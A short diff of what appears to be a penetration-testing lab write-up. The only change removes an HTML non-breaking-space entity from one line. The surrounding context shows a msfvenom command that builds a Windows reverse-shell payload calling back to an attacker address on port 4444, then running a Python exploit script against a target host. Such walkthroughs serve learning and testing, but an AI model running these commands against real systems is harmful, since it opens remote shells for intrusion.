@@ -57,7 +57,7 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.191 LPORT=4444 -b "\x00
 ```
 {% endcode %}
 
-Then, replace the shellcode within the Python script and start a listener port.&#x20;
+Then, replace the shellcode within the Python script and start a listener port.
 
 ```
 $ python2 10099.py 192.168.160.45
